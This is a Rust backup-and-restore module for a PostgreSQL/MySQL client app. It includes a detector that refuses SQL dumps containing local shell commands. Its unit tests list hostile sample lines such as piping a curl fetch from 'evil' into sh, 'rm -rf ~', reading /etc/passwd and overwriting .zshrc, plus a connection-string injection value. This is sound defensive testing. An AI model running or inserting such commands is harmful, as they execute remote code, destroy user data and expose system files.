//! 백업·복원: pg_dump / pg_restore / psql, mysqldump / mysql 을 돌린다 (PATH 와 흔한 설치 위치에서 찾는다).
//! 비밀번호는 명령줄이 아니라 환경변수로 (ps 에 보이지 않게). SSH 터널이면 터널 포트로. 진행은 쓴(읽은) 바이트
use crate::app::{AppState, ensure_pool, split_target};
use crate::error::{AppError, AppResult};
use crate::store::DbKind;
use crate::transfer::Job;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::Ordering;

#[derive(Debug, Clone, Default, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BackupOptions {
    /// PG: "custom" (pg_restore 로 되살린다, 기본) · "plain" (SQL 파일)
    #[serde(default)]
    pub format: String,
    #[serde(default)]
    pub schema_only: bool,
    #[serde(default)]
    pub data_only: bool,
    /// PG: 이 스키마들만 (비면 전부)
    #[serde(default)]
    pub schemas: Vec<String>,
}

#[derive(Debug, Clone, Default, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RestoreOptions {
    /// PG custom: 있던 객체를 먼저 지운다 (--clean --if-exists)
    #[serde(default)]
    pub clean: bool,
}

/// 도구가 있을 만한 폴더 (PATH 다음)
fn tool_dirs() -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = std::env::var_os("PATH").map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
    for d in ["/opt/homebrew/bin", "/usr/local/bin", "/opt/homebrew/opt/libpq/bin", "/usr/local/opt/libpq/bin", "/opt/homebrew/opt/mysql-client/bin", "/usr/local/opt/mysql-client/bin", "/opt/homebrew/opt/mysql/bin", "/usr/local/mysql/bin", "/usr/bin"] {
        dirs.push(d.into());
    }
    // 버전별 폴더: postgresql@16, mysql-client@8.4, Postgres.app, /usr/lib/postgresql/16
    for (parent, prefix, sub) in [
        ("/opt/homebrew/opt", "postgresql@", "bin"),
        ("/usr/local/opt", "postgresql@", "bin"),
        ("/opt/homebrew/opt", "libpq@", "bin"),
        ("/opt/homebrew/opt", "mysql-client@", "bin"),
        ("/opt/homebrew/opt", "mysql@", "bin"),
        ("/Applications/Postgres.app/Contents/Versions", "", "bin"),
        ("/usr/lib/postgresql", "", "bin"),
    ] {
        if let Ok(rd) = std::fs::read_dir(parent) {
            for e in rd.flatten() {
                if e.file_name().to_string_lossy().starts_with(prefix) {
                    dirs.push(e.path().join(sub));
                }
            }
        }
    }
    dirs
}

/// "pg_dump (PostgreSQL) 16.4" → [16, 4]
fn version_of(p: &Path) -> Vec<u64> {
    let out = std::process::Command::new(p).arg("--version").output().ok();
    let text = out.map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default();
    text.split(|c: char| !c.is_ascii_digit() && c != '.').find(|w| w.contains('.') || w.parse::<u64>().is_ok()).map(|w| w.split('.').filter_map(|x| x.parse().ok()).collect()).unwrap_or_default()
}

/// 도구 위치: PATH, Homebrew·Postgres.app·리눅스 기본 위치. 여럿이면 버전이 가장 높은 것
pub fn find_tool(name: &str) -> Option<PathBuf> {
    find_tool_for(name, None)
}

/// 서버 주 버전에 맞는 도구: 서버 이상 중 가장 가까운 것 (pg_dump 는 서버보다 낮으면 못 쓰고, 너무 높으면 옛 서버가 모르는 SET 을 쓴다).
/// 서버 이상이 없으면 가장 높은 것 (도구가 버전 차이를 알려 준다)
pub fn find_tool_for(name: &str, server_major: Option<u64>) -> Option<PathBuf> {
    let mut found: Vec<PathBuf> = tool_dirs().into_iter().map(|d| d.join(name)).filter(|p| p.is_file()).collect();
    found.dedup();
    let mut with_v: Vec<(Vec<u64>, PathBuf)> = found.into_iter().map(|p| (version_of(&p), p)).collect();
    with_v.sort();
    if let Some(m) = server_major
        && let Some((_, p)) = with_v.iter().find(|(v, _)| v.first().is_some_and(|&x| x >= m))
    {
        return Some(p.clone());
    }
    with_v.pop().map(|x| x.1)
}

/// PG 서버 주 버전 (16, 17 …)
async fn pg_major(st: &AppState, id: &str) -> Option<u64> {
    let r = ensure_pool(st, id).await.ok()?.run_query("SHOW server_version_num", 1).await.ok()?;
    crate::db::cell_text(r.rows.first()?.first()?).parse::<u64>().ok().map(|n| n / 10000)
}

/// 새 pg_dump 가 백업 머리에 넣는데 예전 서버는 모르는 설정 (이름, 생긴 버전)
const NEWER_SETTINGS: &[(&str, u64)] = &[("SET transaction_timeout", 17)];

/// 예전 서버가 모르는 SET 줄을 뺀 SQL 사본 (뺄 것이 없는 서버면 None)
fn strip_newer_settings(src: &Path, server: Option<u64>) -> AppResult<Option<PathBuf>> {
    use std::io::{BufRead, Write};
    let drop: Vec<&str> = NEWER_SETTINGS.iter().filter(|(_, v)| server.is_some_and(|s| s < *v)).map(|(n, _)| *n).collect();
    if drop.is_empty() {
        return Ok(None);
    }
    let out = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
    let mut r = std::io::BufReader::new(std::fs::File::open(src)?);
    let mut w = std::io::BufWriter::new(private_file(&out)?);
    let mut line = Vec::new();
    while r.read_until(b'\n', &mut line)? > 0 {
        if !(line.starts_with(b"SET ") && drop.iter().any(|d| line.starts_with(d.as_bytes()))) {
            w.write_all(&line)?;
        }
        line.clear();
    }
    w.flush()?;
    Ok(Some(out))
}

/// 본인만 읽고 쓰는 파일 (0600). 덤프에는 데이터가 다 들어 있어서 /tmp 에서 남이 읽지 못하게
fn private_file(path: &Path) -> std::io::Result<std::fs::File> {
    let mut o = std::fs::OpenOptions::new();
    o.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
        o.mode(0o600);
        let f = o.open(path)?;
        // 이미 있던 파일 (사용자가 덮어쓰기로 고른 백업 파일) 도
        f.set_permissions(std::fs::Permissions::from_mode(0o600))?;
        return Ok(f);
    }
    #[allow(unreachable_code)]
    o.open(path)
}

/// pg_dump · pg_restore · psql 의 -d: 값은 접속 문자열로도 읽히므로 (host=… 를 넣으면 다른 서버로 간다) DB 이름 하나로 묶는다
fn pg_dbname(db: &str) -> String {
    format!("dbname='{}'", db.replace('\\', "\\\\").replace('\'', "\\'"))
}

/// SQL 파일 안의 클라이언트 명령 중 이 컴퓨터에서 무언가를 하는 것 (psql \! · \o |… · \copy … program · \i, mysql system · tee · pager · source).
/// COPY … FROM stdin 의 데이터 줄은 보지 않는다. 있으면 그 줄
pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String> {
    let mut copy = false;
    for line in sql.split(b'\n') {
        let line = String::from_utf8_lossy(&line.ok()?).into_owned();
        let line = line.trim_end_matches('\r');
        let t = line.trim_start();
        if copy {
            copy = t != "\\.";
            continue;
        }
        let low = t.to_lowercase();
        if kind == DbKind::Postgres && low.starts_with("copy ") && low.trim_end().ends_with("from stdin;") {
            copy = true;
            continue;
        }
        let Some(cmd) = t.strip_prefix('\\') else {
            if kind == DbKind::Mysql && ["system ", "tee ", "pager ", "source ", "notee", "nopager"].iter().any(|c| low.starts_with(c)) {
                return Some(line.to_string());
            }
            continue;
        };
        let name: String = cmd.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '!' || *c == '.').collect::<String>().to_lowercase();
        let bad = match kind {
            DbKind::Postgres => name.starts_with('!') || ["i", "ir", "include", "include_relative", "setenv"].contains(&name.as_str())
                || (["o", "out", "g", "gx", "w", "write"].contains(&name.as_str()) && cmd.contains('|'))
                || (name == "copy" && cmd.to_lowercase().contains("program")),
            _ => name.starts_with('!') || ["t", "p", "."].contains(&name.as_str()),
        };
        if bad {
            return Some(line.to_string());
        }
    }
    None
}

fn missing(tool: &str) -> AppError {
    let hint = if tool.starts_with("pg_") || tool == "psql" {
        "Install the PostgreSQL client tools (macOS: brew install libpq · Ubuntu: sudo apt install postgresql-client) — the version must be at least the server's."
    } else {
        "Install the MySQL client tools (macOS: brew install mysql-client · Ubuntu: sudo apt install mysql-client)."
    };
    AppError::Msg(format!("{tool} was not found. {hint}"))
}

/// 접속 정보: (호스트, 포트, 사용자, DB, 비밀번호, 설정)
async fn endpoint(st: &AppState, id: &str) -> AppResult<(String, u16, String, String, Option<String>, crate::store::ConnectionConfig)> {
    let cfg = st.source(id)?;
    let (base, db) = split_target(id);
    let db = db.map(String::from).unwrap_or_else(|| crate::sql::default_db(&cfg));
    // SSH 터널이면 터널을 연 뒤 그 포트로
    ensure_pool(st, id).await?;
    let local = st.tunnels.read().await.get(id).map(|t| t.local_port);
    let (host, port) = match local {
        Some(p) => ("127.0.0.1".to_string(), p),
        None => (cfg.host.clone(), cfg.port),
    };
    Ok((host, port, cfg.user.clone(), db, st.secret(base)?, cfg))
}

/// 복원할 SQL 에 이 컴퓨터에서 명령을 돌리는 줄이 있으면 멈춘다 (pg_dump · mysqldump 는 그런 줄을 쓰지 않는다)
fn refuse_local_commands(file: &Path, kind: DbKind) -> AppResult<()> {
    match local_command(std::io::BufReader::new(std::fs::File::open(file)?), kind) {
        Some(line) => Err(AppError::Msg(format!("This file runs commands on your computer, so it was not restored (pg_dump / mysqldump never write these):\n{}", line.chars().take(200).collect::<String>()))),
        None => Ok(()),
    }
}

/// 도구를 돌린다: stdin = 이 파일을 넣으며 진행, stdout = 이 파일로, watch = 이 파일 크기로 진행. 취소되면 끝낸다
async fn run_tool(mut cmd: tokio::process::Command, tool: &str, stdin: Option<&Path>, stdout: Option<&Path>, watch: Option<&Path>, job: &Arc<Job>) -> AppResult<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    cmd.stderr(std::process::Stdio::piped()).kill_on_drop(true);
    cmd.stdin(if stdin.is_some() { std::process::Stdio::piped() } else { std::process::Stdio::null() });
    match stdout {
        Some(p) => cmd.stdout(private_file(p)?),
        None => cmd.stdout(std::process::Stdio::null()),
    };
    let mut child = cmd.spawn().map_err(|e| AppError::Msg(format!("Could not start {tool}: {e}")))?;
    let mut err = child.stderr.take().unwrap();
    let errs = tokio::spawn(async move {
        let mut s = String::new();
        let _ = err.read_to_string(&mut s).await;
        s
    });
    let feed = match (stdin, child.stdin.take()) {
        (Some(p), Some(mut w)) => {
            let mut f = tokio::fs::File::open(p).await?;
            let job = job.clone();
            Some(tokio::spawn(async move {
                let mut buf = vec![0u8; 256 * 1024];
                loop {
                    let n = f.read(&mut buf).await?;
                    if n == 0 || job.cancelled() {
                        break;
                    }
                    w.write_all(&buf[..n]).await?;
                    job.done.fetch_add(n as u64, Ordering::Relaxed);
                }
                drop(w);
                Ok::<_, std::io::Error>(())
            }))
        }
        _ => None,
    };
    let status = loop {
        tokio::select! {
            s = child.wait() => break s?,
            _ = tokio::time::sleep(std::time::Duration::from_millis(250)) => {
                if let Some(m) = watch.and_then(|w| std::fs::metadata(w).ok()) {
                    job.done.store(m.len(), Ordering::Relaxed);
                }
                if job.cancelled() {
                    let _ = child.kill().await;
                    return Err(AppError::Msg(crate::transfer::CANCELLED.into()));
                }
            }
        }
    };
    if let Some(f) = feed {
        let _ = f.await;
    }
    let stderr = errs.await.unwrap_or_default();
    if !status.success() {
        let tail: Vec<&str> = stderr.lines().filter(|l| !l.trim().is_empty()).collect();
        let tail = tail[tail.len().saturating_sub(8)..].join("\n");
        return Err(AppError::Msg(format!("{tool} failed ({status}):\n{tail}")));
    }
    Ok(())
}

/// PG 접속 환경변수 (비밀번호·SSL 은 명령줄에 싣지 않는다)
fn pg_env(cmd: &mut tokio::process::Command, password: Option<&str>, cfg: &crate::store::ConnectionConfig) {
    if let Some(p) = password {
        cmd.env("PGPASSWORD", p);
    }
    cmd.env("PGCONNECT_TIMEOUT", "10");
    match cfg.active_ssl() {
        Some(s) => {
            cmd.env("PGSSLMODE", s.mode());
            for (k, v) in [("PGSSLROOTCERT", &s.ca_file), ("PGSSLCERT", &s.cert_file), ("PGSSLKEY", &s.key_file)] {
                if !v.is_empty() {
                    cmd.env(k, v);
                }
            }
        }
        None => {
            cmd.env("PGSSLMODE", "prefer");
        }
    }
}

fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) {
    cmd.arg("-h").arg(host).arg("-P").arg(port.to_string()).arg("-u").arg(user).arg("--protocol=TCP");
    if let Some(p) = password {
        cmd.env("MYSQL_PWD", p);
    }
    if let Some(s) = cfg.active_ssl() {
        cmd.arg(format!("--ssl-mode={}", match s.mode() { "verify-full" => "VERIFY_IDENTITY", "verify-ca" => "VERIFY_CA", _ => "REQUIRED" }));
        for (k, v) in [("--ssl-ca", &s.ca_file), ("--ssl-cert", &s.cert_file), ("--ssl-key", &s.key_file)] {
            if !v.is_empty() {
                cmd.arg(format!("{k}={v}"));
            }
        }
    }
}

impl AppState {
    /// 백업 파일을 만든다. 쓴 바이트 (실패·취소하면 쓰던 파일을 지운다)
    pub async fn backup(&self, id: String, path: String, opts: BackupOptions, job_id: String) -> AppResult<u64> {
        let job = self.job(&job_id).unwrap_or_else(|| self.start_job(&job_id));
        let file = PathBuf::from(&path);
        let r = async {
            let (host, port, user, db, password, cfg) = endpoint(self, &id).await?;
            match cfg.kind {
                DbKind::Postgres => {
                    let tool = find_tool_for("pg_dump", pg_major(self, &id).await).ok_or_else(|| missing("pg_dump"))?;
                    let mut cmd = tokio::process::Command::new(tool);
                    cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                    drop(private_file(&file)?);
                    cmd.arg("-F").arg(if opts.format == "plain" { "p" } else { "c" }).arg("-f").arg(&file);
                    if opts.schema_only {
                        cmd.arg("--schema-only");
                    }
                    if opts.data_only {
                        cmd.arg("--data-only");
                    }
                    for sc in &opts.schemas {
                        cmd.arg("-n").arg(sc);
                    }
                    pg_env(&mut cmd, password.as_deref(), &cfg);
                    run_tool(cmd, "pg_dump", None, None, Some(&file), &job).await?;
                }
                DbKind::Mysql => {
                    let tool = find_tool("mysqldump").ok_or_else(|| missing("mysqldump"))?;
                    let mut cmd = tokio::process::Command::new(tool);
                    my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg);
                    cmd.args(["--single-transaction", "--routines", "--triggers", "--events", "--hex-blob"]);
                    if opts.schema_only {
                        cmd.arg("--no-data");
                    }
                    if opts.data_only {
                        cmd.arg("--no-create-info");
                    }
                    // -- 뒤는 DB 이름으로만 읽는다 (서버가 보여 준 "--tee=…" 같은 이름이 옵션이 되지 않게)
                    cmd.arg("--").arg(&db);
                    run_tool(cmd, "mysqldump", None, Some(&file), Some(&file), &job).await?;
                }
                DbKind::Redis => return Err(AppError::Msg("Back up Redis with BGSAVE / its RDB file".into())),
                k => return Err(AppError::Msg(format!("Back up is not available for {k:?} data sources yet"))),
            }
            Ok(std::fs::metadata(&file)?.len())
        }
        .await;
        self.end_job(&job_id);
        if r.is_err() {
            let _ = std::fs::remove_file(&file);
        }
        r
    }

    /// 백업 파일로 되살린다 (pg_dump custom → pg_restore, SQL → psql / mysql). 한 트랜잭션: 실패하면 되돌린다 (MySQL DDL 은 예외)
    pub async fn restore(&self, id: String, path: String, opts: RestoreOptions, job_id: String) -> AppResult<()> {
        let job = self.job(&job_id).unwrap_or_else(|| self.start_job(&job_id));
        let file = PathBuf::from(&path);
        let r = async {
            let cfg = self.source(&id)?;
            if cfg.read_only {
                return Err(AppError::Msg(format!("Data source \"{}\" is read-only", cfg.name)));
            }
            let size = std::fs::metadata(&file).map_err(|e| AppError::Msg(format!("Can't read {path}: {e}")))?.len();
            let (host, port, user, db, password, cfg) = endpoint(self, &id).await?;
            match cfg.kind {
                DbKind::Postgres => {
                    let mut head = [0u8; 5];
                    let custom = std::io::Read::read_exact(&mut std::fs::File::open(&file)?, &mut head).is_ok() && &head == b"PGDMP";
                    let server = pg_major(self, &id).await;
                    let mut sql_file = None;
                    if custom {
                        let tool = find_tool_for("pg_restore", server).ok_or_else(|| missing("pg_restore"))?;
                        let mut cmd = tokio::process::Command::new(tool);
                        cmd.args(["--no-owner"]);
                        if opts.clean {
                            cmd.args(["--clean", "--if-exists"]);
                        }
                        if NEWER_SETTINGS.iter().any(|(_, v)| server.is_some_and(|s| s < *v)) {
                            // 예전 서버: SQL 로 풀어서 모르는 설정을 빼고 psql 로 (pg_restore 는 그 SET 에서 멈춘다)
                            let tmp = std::env::temp_dir().join(format!("qurry-restore-{}.sql", uuid::Uuid::new_v4()));
                            // pg_restore 가 쓰기 전에 본인만 읽는 파일로 만들어 둔다 (덤프에는 데이터가 다 들어 있다)
                            drop(private_file(&tmp)?);
                            cmd.arg("-f").arg(&tmp).arg(&file);
                            let r = run_tool(cmd, "pg_restore", None, None, None, &job).await;
                            let stripped = r.and_then(|_| strip_newer_settings(&tmp, server));
                            std::fs::remove_file(&tmp).ok();
                            sql_file = stripped?;
                        } else {
                            cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                            cmd.args(["--exit-on-error", "--single-transaction"]);
                            cmd.arg(&file);
                            pg_env(&mut cmd, password.as_deref(), &cfg);
                            run_tool(cmd, "pg_restore", None, None, None, &job).await?;
                        }
                    } else {
                        refuse_local_commands(&file, DbKind::Postgres)?;
                        sql_file = strip_newer_settings(&file, server)?;
                    }
                    if !custom || sql_file.is_some() {
                        let src = sql_file.clone().unwrap_or_else(|| file.clone());
                        let tool = find_tool_for("psql", server).ok_or_else(|| missing("psql"))?;
                        let mut cmd = tokio::process::Command::new(tool);
                        cmd.arg("-h").arg(&host).arg("-p").arg(port.to_string()).arg("-U").arg(&user).arg("-d").arg(pg_dbname(&db)).arg("--no-password");
                        cmd.args(["-X", "-q", "-v", "ON_ERROR_STOP=1", "--single-transaction", "-f", "-"]);
                        pg_env(&mut cmd, password.as_deref(), &cfg);
                        job.total.store(std::fs::metadata(&src).map(|m| m.len()).unwrap_or(size), Ordering::Relaxed);
                        let r = run_tool(cmd, "psql", Some(&src), None, None, &job).await;
                        if let Some(t) = sql_file {
                            std::fs::remove_file(t).ok();
                        }
                        r?;
                    }
                }
                DbKind::Mysql => {
                    refuse_local_commands(&file, DbKind::Mysql)?;
                    let tool = find_tool("mysql").ok_or_else(|| missing("mysql"))?;
                    let mut cmd = tokio::process::Command::new(tool);
                    my_args(&mut cmd, &host, port, &user, password.as_deref(), &cfg);
                    cmd.arg("--").arg(&db);
                    job.total.store(size, Ordering::Relaxed);
                    run_tool(cmd, "mysql", Some(&file), None, None, &job).await?;
                }
                DbKind::Redis => return Err(AppError::Msg("Restore Redis from its RDB file".into())),
                k => return Err(AppError::Msg(format!("Restore is not available for {k:?} data sources yet"))),
            }
            Ok(())
        }
        .await;
        self.end_job(&job_id);
        r
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pg_dbname_is_one_literal_name() {
        assert_eq!(pg_dbname("shop"), "dbname='shop'");
        assert_eq!(pg_dbname("host=evil dbname=x"), "dbname='host=evil dbname=x'");
        assert_eq!(pg_dbname("it's\\"), "dbname='it\\'s\\\\'");
    }

    #[test]
    fn restore_scripts_with_local_commands_are_refused() {
        use DbKind::{Mysql, Postgres};
        assert!(local_command("\\connect shop\nSET x = 1;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n\\!rm -rf ~\n\\.\n\\restrict abc\n".as_bytes(), Postgres).is_none());
        for bad in ["\\! curl evil | sh", "  \\o |cat > ~/.zshrc", "\\g |sh", "\\copy t to program 'sh'", "\\i /etc/passwd", "\\setenv PAGER x"] {
            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
        }
        assert!(local_command("-- MySQL dump\nCREATE TABLE t (a int);\nINSERT INTO t VALUES (1);\n".as_bytes(), Mysql).is_none());
        for bad in ["system rm -rf ~", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd"] {
            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Mysql).is_some(), "{bad}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn dump_files_are_private() {
        use std::os::unix::fs::PermissionsExt;
        let p = std::env::temp_dir().join(format!("qurry-priv-{}.sql", uuid::Uuid::new_v4()));
        std::fs::write(&p, "x").unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o644)).unwrap();
        drop(private_file(&p).unwrap());
        assert_eq!(std::fs::metadata(&p).unwrap().permissions().mode() & 0o777, 0o600);
        std::fs::remove_file(p).ok();
    }

    #[test]
    fn strips_settings_old_servers_do_not_know() {
        let src = std::env::temp_dir().join(format!("qurry-strip-{}.sql", uuid::Uuid::new_v4()));
        std::fs::write(&src, "SET statement_timeout = 0;\nSET transaction_timeout = 0;\nCREATE TABLE t (x int);\n").unwrap();
        assert!(strip_newer_settings(&src, Some(17)).unwrap().is_none());
        let out = strip_newer_settings(&src, Some(12)).unwrap().unwrap();
        assert_eq!(std::fs::read_to_string(&out).unwrap(), "SET statement_timeout = 0;\nCREATE TABLE t (x int);\n");
        std::fs::remove_file(src).ok();
        std::fs::remove_file(out).ok();
    }

    #[test]
    fn finds_tools_or_explains() {
        // 이 PC 에 없으면 None (설치 안내는 backup 이 한다)
        if let Some(p) = find_tool("pg_dump") {
            assert!(p.ends_with("pg_dump"));
        }
        assert!(find_tool("surely_not_a_tool_qurry").is_none());
    }

    async fn state() -> Option<AppState> {
        let e = std::env::var("QURRY_TEST_PG").ok()?;
        let p: Vec<&str> = e.split(':').collect();
        let dir = std::env::temp_dir().join(format!("qurry-bak-{}", uuid::Uuid::new_v4()));
        let st = crate::open_state(Some(dir)).unwrap();
        let cfg: crate::store::ConnectionConfig = serde_json::from_value(serde_json::json!({ "id": "b", "name": "b", "kind": "postgres", "host": p[0], "port": p[1].parse::<u16>().unwrap(), "user": p[2], "database": p[3] })).unwrap();
        st.store.save(&cfg).unwrap();
        Some(st)
    }

    /// pgvector (확장이 있는 서버에서만): 가까운 행 SQL 이 인덱스 연산자를 쓰고 거리 순으로 나온다. 벡터 값은 글로 보인다
    #[tokio::test]
    #[ignore]
    async fn pgvector_similar_rows() {
        let Some(st) = state().await else { return };
        let q = |s: &str| st.run_query("b".into(), s.into(), None, None);
        if q("create extension if not exists vector").await.is_err() {
            return;
        }
        q("drop table if exists qurry_vec").await.ok();
        q("create table qurry_vec (id int primary key, name text, embedding vector(3))").await.unwrap();
        q("insert into qurry_vec values (1, 'apple', '[1,0,0]'), (2, 'apricot', '[0.9,0.1,0]'), (3, 'pear', '[0,1,0]')").await.unwrap();
        q("create index on qurry_vec using hnsw (embedding vector_cosine_ops)").await.unwrap();
        let d = st.table_detail("b".into(), "public".into(), "qurry_vec".into()).await.unwrap();
        assert!(d.columns.iter().any(|c| c.name == "embedding" && crate::sql::is_vector_type(&c.data_type)), "{:?}", d.columns.iter().map(|c| &c.data_type).collect::<Vec<_>>());
        let sql = st.similar_rows_sql("b".into(), "public".into(), "qurry_vec".into(), "embedding".into(), vec![("id".into(), Some("1".into()))]).await.unwrap();
        assert!(sql.contains("<=>"), "{sql}");
        let r = q(&sql).await.unwrap();
        let name = r.columns.iter().position(|c| c.name == "name").unwrap();
        assert_eq!(r.rows.iter().map(|x| x[name].clone()).collect::<Vec<_>>(), vec![serde_json::json!("apricot"), serde_json::json!("pear")]);
        let emb = r.columns.iter().position(|c| c.name == "embedding").unwrap();
        assert_eq!(r.rows[0][emb], serde_json::json!("[0.9,0.1,0]"));
        // halfvec · sparsevec 도 PG 가 보여 주는 글 그대로
        let h = q("select '[1,0.5,-2]'::halfvec h, '{1:0.5,3:1}/5'::sparsevec s, '[0.25,1e-3]'::vector v").await.unwrap();
        assert_eq!(h.rows[0], vec![serde_json::json!("[1,0.5,-2]"), serde_json::json!("{1:0.5,3:1}/5"), serde_json::json!("[0.25,0.001]")]);
        q("drop table qurry_vec").await.ok();
    }

    /// MySQL: mysqldump → 지우기 → mysql 로 되살리기 (도구가 있을 때만)
    #[tokio::test]
    #[ignore]
    async fn mysql_backup_and_restore_roundtrip() {
        let Ok(e) = std::env::var("QURRY_TEST_MY") else { return };
        if find_tool("mysqldump").is_none() || find_tool("mysql").is_none() {
            return;
        }
        let p: Vec<&str> = e.split(':').collect();
        let dir = std::env::temp_dir().join(format!("qurry-bakm-{}", uuid::Uuid::new_v4()));
        let st = crate::open_state(Some(dir.clone())).unwrap();
        let cfg: crate::store::ConnectionConfig = serde_json::from_value(serde_json::json!({ "id": "m", "name": "m", "kind": "mysql", "host": p[0], "port": p[1].parse::<u16>().unwrap(), "user": p[2], "database": p[4] })).unwrap();
        st.save_connection(cfg, Some(p[3].into()), None).await.unwrap();
        // 전용 DB: 다른 테스트가 같은 DB 에서 테이블을 만들고 지우는 동안 덤프하면 깨진다
        st.run_query("m".into(), "create database if not exists qurry_bak".into(), None, None).await.unwrap();
        let q = |s: &str| st.run_query("m::qurry_bak".into(), s.into(), None, None);
        q("drop table if exists bak_t").await.ok();
        q("create table bak_t (id int primary key, h varchar(40))").await.unwrap();
        q("insert into bak_t values (1, 'a'), (2, 'it''s'), (3, null)").await.unwrap();
        let file = dir.join("m.sql").to_string_lossy().to_string();
        assert!(st.backup("m::qurry_bak".into(), file.clone(), BackupOptions::default(), "j".into()).await.unwrap() > 100);
        q("drop table bak_t").await.unwrap();
        st.restore("m::qurry_bak".into(), file, RestoreOptions::default(), "r".into()).await.unwrap();
        assert_eq!(q("select count(*) from bak_t").await.unwrap().rows[0][0], serde_json::json!(3));
        st.run_query("m".into(), "drop database qurry_bak".into(), None, None).await.ok();
    }

    /// 백업 → 지우기 → 되살리기 → 데이터가 그대로 (custom 과 SQL 둘 다)
    #[tokio::test]
    #[ignore]
    async fn pg_backup_and_restore_roundtrip() {
        let Some(st) = state().await else { return };
        if find_tool("pg_dump").is_none() {
            return;
        }
        let q = |s: &str| st.run_query("b".into(), s.into(), None, None);
        q("drop schema if exists qurry_bak cascade").await.ok();
        q("create schema qurry_bak").await.unwrap();
        q("create table qurry_bak.t as select g as id, md5(g::text) as h from generate_series(1, 5000) g").await.unwrap();
        let dir = std::env::temp_dir().join(format!("qurry-bakf-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        for format in ["custom", "plain"] {
            let file = dir.join(format!("b.{format}")).to_string_lossy().to_string();
            let opts = BackupOptions { format: format.into(), schemas: vec!["qurry_bak".into()], ..Default::default() };
            let n = st.backup("b".into(), file.clone(), opts, format!("j-{format}")).await.unwrap();
            assert!(n > 1000, "{format}: {n} bytes");
            q("drop schema qurry_bak cascade").await.unwrap();
            st.restore("b".into(), file, RestoreOptions::default(), format!("r-{format}")).await.unwrap();
            assert_eq!(q("select count(*) from qurry_bak.t").await.unwrap().rows[0][0], serde_json::json!(5000), "{format}");
        }
        // 비밀번호 같은 것이 명령줄로 가지 않는다: 실패해도 메시지에 도구 출력이 실린다
        let e = st.restore("b".into(), dir.join("missing.sql").to_string_lossy().into(), RestoreOptions::default(), "r-x".into()).await.unwrap_err().to_string();
        assert!(!e.is_empty());
        q("drop schema qurry_bak cascade").await.ok();
        std::fs::remove_dir_all(dir).ok();
    }
}
